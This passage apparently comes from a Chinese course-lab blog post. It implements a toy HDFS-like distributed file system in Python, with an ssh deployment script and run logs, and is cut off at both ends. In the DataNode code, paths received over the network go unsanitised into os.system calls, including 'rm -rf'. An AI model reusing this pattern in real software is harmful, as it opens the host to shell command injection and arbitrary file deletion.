class="params">self, sock_fd, dfs_path</span>):</span><br><span class="line">    <span class="comment"># 从Client获取块数据</span></span><br><span class="line">    chunk_data = sock_fd.recv(BUF_SIZE)</span><br><span class="line">    <span class="comment"># 本地路径</span></span><br><span class="line">    local_path = os.path.join(DATA_NODE_DIR, dfs_path)</span><br><span class="line">    <span class="comment"># 若目录不存在则创建新目录</span></span><br><span class="line">    os.system(<span class="string">&quot;mkdir -p &#123;&#125;&quot;</span>.<span class="built_in">format</span>(os.path.dirname(local_path)))</span><br><span class="line">    <span class="comment"># 将数据块写入本地文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(local_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(chunk_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Store chunk &#123;&#125; successfully~&quot;</span>.<span class="built_in">format</span>(local_path)</span><br></pre></td></tr></table></figure><h3 id="client-py"><a href="http://client.py">client.py</a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">copyFromLocal</span>(<span class="params">self, local_path, dfs_path</span>):</span><br><span class="line">    file_size = os.path.getsize(local_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;File size: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(file_size))</span><br><span class="line"></span><br><span class="line">    request = <span class="string">&quot;new_fat_item &#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(dfs_path, file_size)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Request: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(request))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从NameNode获取一张FAT表</span></span><br><span class="line">    self.name_node_sock.send(<span class="built_in">bytes</span>(request, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    fat_pd = self.name_node_sock.recv(BUF_SIZE)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印FAT表，并使用pandas读取</span></span><br><span class="line">    fat_pd = <span class="built_in">str</span>(fat_pd, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Fat: \n&#123;&#125;&quot;</span>.<span class="built_in">format</span>(fat_pd))</span><br><span class="line">    fat = pd.read_csv(StringIO(fat_pd))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 根据FAT表逐个向目标DataNode发送数据块</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(local_path) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> idx, row <span class="keyword">in</span> fat.iterrows():</span><br><span class="line">            data = fp.read(<span class="built_in">int</span>(row[<span class="string">&#x27;blk_size&#x27;</span>]))</span><br><span class="line">            datanode_hosts = re.findall(<span class="string">r&quot;&#x27;(.+?)&#x27;&quot;</span>, row[<span class="string">&#x27;host_name&#x27;</span>])  <span class="comment"># 正则表达式</span></span><br><span class="line">            <span class="keyword">for</span> host <span class="keyword">in</span> datanode_hosts:</span><br><span class="line">                data_node_sock = socket.socket()</span><br><span class="line">                data_node_sock.connect((host, DATA_NODE_PORT))</span><br><span class="line">                blk_path = dfs_path + <span class="string">&quot;.blk&#123;&#125;&quot;</span>.<span class="built_in">format</span>(row[<span class="string">&#x27;blk_no&#x27;</span>])</span><br><span class="line"></span><br><span class="line">                request = <span class="string">&quot;store &#123;&#125;&quot;</span>.<span class="built_in">format</span>(blk_path)</span><br><span class="line">                data_node_sock.send(<span class="built_in">bytes</span>(request, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                time.sleep(<span class="number">0.2</span>)  <span class="comment"># 两次传输需要间隔一段时间，避免粘包</span></span><br><span class="line">                data_node_sock.send(<span class="built_in">bytes</span>(data, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                data_node_sock.close()</span><br></pre></td></tr></table></figure><blockquote><p>扩展：</p><p><strong>1.TCP粘包问题</strong><br>原因：在TCP的socket编程中，发送端和接收端都有成对的socket。发送端为了将多个发往接收端的包，更加高效的的发给接收端，于是采用了优化算法（Nagle算法），将多次间隔较小、数据量较小的数据，合并成一个数据量大的数据块，然后进行封包。出现粘包的原因是多方面的，可能是来自发送方，也可能是来自接收方。<br>解决方式：</p><p>发送方两次发送间隔一段时间（低性能），或发送方关闭Nagle算法</p><p>接受方简单的处理思路如下，随着需求演化，逐渐形成了应用层协议：</p><ol><li>在数据流中设置分段标志，比如C语言字符串使用’\n’作为字符串结束标志，但这又涉及到一个转义和不安全的问题。</li><li>设置收发格式，比如规定前多少字节表示packet的大小，这也是后面实验中使用的方法。</li></ol><p>只有TCP存在粘包问题，因为TCP是面向流的，而UDP是面向消息的，有消息边界。</p><p><strong>2.StringIO</strong></p><p>io 模块中的 <code>io.StringIO</code> 能生成内存中的类文件对象（in-memory file-like object），此对象可用作需要标准文件对象的大多数函数的输入或输出。</p><p><strong>3.正则表达式</strong></p><p><code>datanode_hosts = re.findall(r&quot;'(.+?)'&quot;, row['host_name'])</code></p><ul><li><p><code>row['host_name']</code>是一个string，值为<code>&quot;['thumm01' 'thumm03' 'thumm05']&quot;</code></p></li><li><p>pattern中的<code>r</code>表示字符串，还可以用<code>b</code>表示字节。</p></li><li><p><code>.</code> 表示匹配除“<code>\</code><em><code>n</code></em>”之外的任何单个字符。要匹配包括“<code>\</code><em><code>n</code></em>”在内的任何字符，请使用像“<code>(.|\n)</code>”的模式。</p></li><li><p><code>+</code> 表示匹配前面的子表达式一次或多次。例如，“<code>zo+</code>”能匹配“<code>zo</code>”以及“<code>zoo</code>”，但不能匹配“<code>z</code>”。+等价于{1,}。</p></li><li><p><code>?</code> 表示非贪婪模式。当该字符紧跟在任何一个其他限制符（*,+,?，{<em>n</em>}，{<em>n</em>,}，{<em>n</em>,<em>m</em>}）后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串“<code>oooo</code>”，“<code>o+?</code>”将匹配单个“<code>o</code>”，而“<code>o+</code>”将匹配所有“<code>o</code>”</p></li><li><p><code>re.findall(r&quot;'(.+?)'&quot;, row['host_name']</code> 结果为一个list，为<code>['thumm01', 'thumm03', 'thumm05']</code></p></li></ul></blockquote><h3 id="pipeline-sh"><a href="http://pipeline.sh">pipeline.sh</a></h3><p>每次一个个去启动数据节点上的太麻烦了，还是写个通过ssh统一控制数据节点的脚本。</p><blockquote><p>第10行的kill命令作用不大，数据节点上的后台进程删不干净（权限不够），这里采取的方法是修改端口重新运行，对不起啦（</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">HOST_LIST=(<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span> <span class="string">&quot;thumm06&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> server <span class="keyword">in</span> <span class="variable">$&#123;HOST_LIST[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  ssh <span class="variable">$server</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">    rm -rf ~/lab2/MyDFS/dfs/data/*;</span></span><br><span class="line"><span class="string">    scp -r thumm01:~/lab2/MyDFS ~/lab2/</span></span><br><span class="line"><span class="string">    cd ~/lab2/MyDFS;</span></span><br><span class="line"><span class="string">    # kill -9 \$(ps -ef | grep MyDFS | awk &#x27;&#123;print \$2&#125;&#x27;);</span></span><br><span class="line"><span class="string">    python3 data_node.py;</span></span><br><span class="line"><span class="string">  &quot;</span> &amp;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">wait</span></span><br></pre></td></tr></table></figure><blockquote><p>如果第11行用python通过<code>bash pipeline.sh</code> 运行时可能得报错：<code> SyntaxError: Non-ASCII character '\xe6' in file data_node.py on line 7, but no encoding declared; see http://python.org/dev/peps/pep-0263/ for details</code>，还会遇到 <code>str() takes at most 1 argument (2 given)</code> 的报错。<br>这是因为thumm05和thumm06默认使python2。为了避免这种问题，可以指定python3解释所写程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxx@thumm05:~$ <span class="built_in">which</span> python</span><br><span class="line">/usr/bin/python</span><br><span class="line">xxxxxxxxxx@thumm05:~$ <span class="built_in">ls</span> -al /usr/bin/python</span><br><span class="line">lrwxrwxrwx 1 root root 9 Nov 23  2017 /usr/bin/python -&gt; python2.7</span><br></pre></td></tr></table></figure></blockquote><h3 id="运行">运行</h3><p>这里使用的已经是添加数据切边冗余备份的代码，各数据节点上的数据切片详见<strong>data replication</strong>一节。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ python client.py -copyFromLocal ./test/test_copyFromLocal.txt test_copyFromLocal.txt</span><br><span class="line">File size: 8411</span><br><span class="line">Request: new_fat_item test_copyFromLocal.txt 8411</span><br><span class="line">Fat: </span><br><span class="line">blk_no,host_name,blk_size</span><br><span class="line">0,[<span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span>],4096</span><br><span class="line">1,[<span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span>],4096</span><br><span class="line">2,[<span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span>],219</span><br></pre></td></tr></table></figure><h2 id="copyToLocal">copyToLocal</h2><p>copyToLocal 是 copyFromLocal 的反向操作</p><h3 id="name-node-py-2">name_node.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_fat_item</span>(<span class="params">self, dfs_path</span>):</span><br><span class="line">    <span class="comment"># 获取FAT表内容</span></span><br><span class="line">    local_path = os.path.join(NAME_NODE_DIR, dfs_path)</span><br><span class="line">    response = pd.read_csv(local_path)</span><br><span class="line">    <span class="keyword">return</span> response.to_csv(index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h3 id="data-node-py-2">data_node.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">self, sock_fd, dfs_path</span>):</span><br><span class="line">    <span class="comment"># 从Client获取块数据</span></span><br><span class="line">    chunk_data = sock_fd.recv(BUF_SIZE)</span><br><span class="line">    <span class="comment"># 本地路径</span></span><br><span class="line">    local_path = os.path.join(DATA_NODE_DIR, dfs_path)</span><br><span class="line">    <span class="comment"># 若目录不存在则创建新目录</span></span><br><span class="line">    os.system(<span class="string">&quot;mkdir -p &#123;&#125;&quot;</span>.<span class="built_in">format</span>(os.path.dirname(local_path)))</span><br><span class="line">    <span class="comment"># 将数据块写入本地文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(local_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(chunk_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Store chunk &#123;&#125; successfully~&quot;</span>.<span class="built_in">format</span>(local_path)</span><br></pre></td></tr></table></figure><h3 id="client-py-2"><a href="http://client.py">client.py</a></h3><ul><li>从NameNode获取一张FAT表</li><li>打印FAT表</li><li>根据FAT表逐个从目标DataNode请求数据块，写入到本地文件中</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">copyToLocal</span>(<span class="params">self, dfs_path, local_path</span>):</span><br><span class="line">    request = <span class="string">&quot;get_fat_item &#123;&#125;&quot;</span>.<span class="built_in">format</span>(dfs_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Request: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(request))</span><br><span class="line">    <span class="comment"># 从NameNode获取一张FAT表；打印FAT表；根据FAT表逐个从目标DataNode请求数据块，写入到本地文件中</span></span><br><span class="line"></span><br><span class="line">    self.name_node_sock.send(<span class="built_in">bytes</span>(request, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    fat_pd = self.name_node_sock.recv(BUF_SIZE)</span><br><span class="line">    fat_pd = <span class="built_in">str</span>(fat_pd, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Fat: \n&#123;&#125;&quot;</span>.<span class="built_in">format</span>(fat_pd))</span><br><span class="line">    fat = pd.read_csv(StringIO(fat_pd))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(local_path, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> idx, row <span class="keyword">in</span> fat.iterrows():</span><br><span class="line">            datanode_hosts = re.findall(<span class="string">r&quot;&#x27;(.+?)&#x27;&quot;</span>, row[<span class="string">&#x27;host_name&#x27;</span>])</span><br><span class="line"></span><br><span class="line">            data_node_sock = socket.socket()</span><br><span class="line">            data_node_sock.connect((datanode_hosts[<span class="number">0</span>], DATA_NODE_PORT))</span><br><span class="line">            blk_path = dfs_path + <span class="string">&#x27;.blk&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(row[<span class="string">&#x27;blk_no&#x27;</span>])</span><br><span class="line"></span><br><span class="line">            request = <span class="string">&quot;load &#123;&#125;&quot;</span>.<span class="built_in">format</span>(blk_path)</span><br><span class="line">            data_node_sock.send(<span class="built_in">bytes</span>(request, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            time.sleep(<span class="number">0.2</span>)</span><br><span class="line">            recv_data = data_node_sock.recv(BUF_SIZE)</span><br><span class="line">            data_node_sock.close()</span><br><span class="line">            fp.write(<span class="built_in">str</span>(recv_data, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h3 id="运行-2">运行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ python client.py -copyToLocal test_copyFromLocal.txt ./test/test_copyToLocal.txt</span><br><span class="line">Request: get_fat_item test_copyFromLocal.txt</span><br><span class="line">Fat: </span><br><span class="line">blk_no,host_name,blk_size</span><br><span class="line">0,[<span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span>],4096</span><br><span class="line">1,[<span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span>],4096</span><br><span class="line">2,[<span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span>],219</span><br></pre></td></tr></table></figure><p><img src="/2023/11/08/%E5%88%86%E5%B8%83%E5%BC%8F-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%EF%BC%88B%EF%BC%89-lab2/image-20231107113845968.png" alt></p><h2 id="ls">ls</h2><h3 id="name-node-py-3">name_node.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">self, dfs_path</span>):</span><br><span class="line">    local_path = os.path.join(NAME_NODE_DIR, dfs_path)</span><br><span class="line">    <span class="comment"># 如果不存在，返回错误信息</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(local_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No such file or directory: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(dfs_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(local_path):</span><br><span class="line">        <span class="comment"># 如果目标地址是一个文件夹，则显示该文件夹下内容</span></span><br><span class="line">        dirs = os.listdir(local_path)</span><br><span class="line">        response = <span class="string">&quot; &quot;</span>.join(dirs)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 如果目标是文件则显示文件的FAT表信息</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(local_path) <span class="keyword">as</span> f:</span><br><span class="line">            response = f.read()</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><h3 id="client-py-3"><a href="http://client.py">client.py</a></h3><p>Client 会向NameNode 发送请求，查看 dfs_path 下的文件或文件夹信息</p><ul><li>向NameNode发送请求，查看dfs_path下文件或者文件夹信息</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">self, dfs_path</span>):</span><br><span class="line">    <span class="comment">#  向NameNode发送请求，查看dfs_path下文件或者文件夹信息</span></span><br><span class="line">    request = <span class="string">&quot;ls &#123;&#125; &quot;</span>.<span class="built_in">format</span>(dfs_path)</span><br><span class="line">    self.name_node_sock.send(<span class="built_in">bytes</span>(request, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    fat_pd = self.name_node_sock.recv(BUF_SIZE)</span><br><span class="line">    fat_pd = <span class="built_in">str</span>(fat_pd, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;file: \n&#123;&#125;&quot;</span>.<span class="built_in">format</span>(fat_pd))</span><br></pre></td></tr></table></figure><h3 id="运行-3">运行</h3><p>向dfs中test_ls文件夹中上传2文件后，使用ls测试：</p><ul><li>查看文件夹</li><li>查看存在的文件</li><li>查看不存在的文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ python client.py -format</span><br><span class="line">format</span><br><span class="line">Format namenode successfully~</span><br><span class="line">Format datanode successfully~</span><br><span class="line">Format datanode successfully~</span><br><span class="line">Format datanode successfully~</span><br><span class="line">Format datanode successfully~</span><br><span class="line">Format datanode successfully~</span><br><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ python client.py -copyFromLocal ./test/test_copyToLocal.txt test_ls/test_ls0.txt</span><br><span class="line">File size: 8411</span><br><span class="line">Request: new_fat_item test_ls/test_ls0.txt 8411</span><br><span class="line">Fat: </span><br><span class="line">blk_no,host_name,blk_size</span><br><span class="line">0,[<span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span>],4096</span><br><span class="line">1,[<span class="string">&#x27;thumm03&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span>],4096</span><br><span class="line">2,[<span class="string">&#x27;thumm04&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span>],219</span><br><span class="line"></span><br><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ python client.py -copyFromLocal ./test/test_copyToLocal.txt test_ls/test_ls0.txt</span><br><span class="line">File size: 8411</span><br><span class="line">Request: new_fat_item test_ls/test_ls0.txt 8411</span><br><span class="line">Fat: </span><br><span class="line">blk_no,host_name,blk_size</span><br><span class="line">0,[<span class="string">&#x27;thumm04&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span>],4096</span><br><span class="line">1,[<span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm04&#x27;</span>],4096</span><br><span class="line">2,[<span class="string">&#x27;thumm05&#x27;</span> <span class="string">&#x27;thumm06&#x27;</span> <span class="string">&#x27;thumm01&#x27;</span>],219</span><br><span class="line"></span><br><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ python client.py -<span class="built_in">ls</span> test_ls</span><br><span class="line">file: </span><br><span class="line">test_ls0.txt</span><br><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ python client.py -<span class="built_in">ls</span> NoExisted.txt</span><br><span class="line">file: </span><br><span class="line">No such file or directory: NoExisted.txt</span><br><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ python client.py -<span class="built_in">ls</span> <span class="built_in">dir</span>/test_ls0.txt</span><br><span class="line">file: </span><br><span class="line">No such file or directory: <span class="built_in">dir</span>/test_ls0.txt</span><br></pre></td></tr></table></figure><h2 id="rm">rm</h2><p>rm: 删除相应路径的文件。</p><h3 id="name-node-py-4">name_node.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rm_fat_item</span>(<span class="params">self, dfs_path</span>):</span><br><span class="line">    local_path = NAME_NODE_DIR + dfs_path</span><br><span class="line">    response = pd.read_csv(local_path)</span><br><span class="line">    os.remove(local_path)</span><br><span class="line">    <span class="keyword">return</span> response.to_csv(index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h3 id="data-node-py-3">data_node.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rm</span>(<span class="params">self, dfs_path</span>):</span><br><span class="line">    local_path = os.path.join(DATA_NODE_DIR, dfs_path)</span><br><span class="line">    rm_command = <span class="string">&quot;rm -rf &quot;</span> + local_path</span><br><span class="line">    os.system(rm_command)</span><br></pre></td></tr></table></figure><h3 id="client-py-4"><a href="http://client.py">client.py</a></h3><ul><li>从NameNode获取改文件的FAT表，获取后NameNode删除对应记录</li><li>打印FAT表</li><li>根据FAT表逐个告诉目标DataNode删除对应数据块</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rm</span>(<span class="params">self, dfs_path</span>):</span><br><span class="line">    request = <span class="string">&quot;rm_fat_item &#123;&#125;&quot;</span>.<span class="built_in">format</span>(dfs_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Request: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(request))</span><br><span class="line">    <span class="comment"># 从NameNode获取改文件的FAT表，获取后删除；打印FAT表；根据FAT表逐个告诉目标DataNode删除对应数据块</span></span><br><span class="line">    self.name_node_sock.send(<span class="built_in">bytes</span>(request, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    fat_pd = self.name_node_sock.recv(BUF_SIZE)</span><br><span class="line">    fat_pd = <span class="built_in">str</span>(fat_pd, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment"># fat_pd = str(self.name_node_sock.recv(BUF_SIZE), encoding=&#x27;utf-8&#x27;)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Fat: \n&#123;&#125;&quot;</span>.<span class="built_in">format</span>(fat_pd))</span><br><span class="line">    fat = pd.read_csv(StringIO(fat_pd))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx, row <span class="keyword">in</span> fat.iterrows():</span><br><span class="line">        data_node_sock = socket.socket()</span><br><span class="line">        data_node_sock.connect((row[<span class="string">&#x27;host_name&#x27;</span>], DATA_NODE_PORT))</span><br><span class="line">        blk_path = dfs_path + <span class="string">&#x27;.blk&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(row[<span class="string">&#x27;blk_no&#x27;</span>])</span><br><span class="line">        request = <span class="string">&quot;rm &#123;&#125;&quot;</span>.<span class="built_in">format</span>(blk_path)</span><br><span class="line">        data_node_sock.send(<span class="built_in">bytes</span>(request, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        recv_data = data_node_sock.recv(BUF_SIZE)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(recv_data, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        data_node_sock.close()</span><br></pre></td></tr></table></figure><h3 id="运行-4">运行</h3><p>执行结果如下，在./dfs/name和./dfs/data中的文件被删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxx@thumm01:~/lab2/MyDFS$ python client.py -copyFromLocal ./test/test_copyToLocal.txt test_rm/test_rm0.txt</span><br><span class="line">File size: 8411</span><br><span 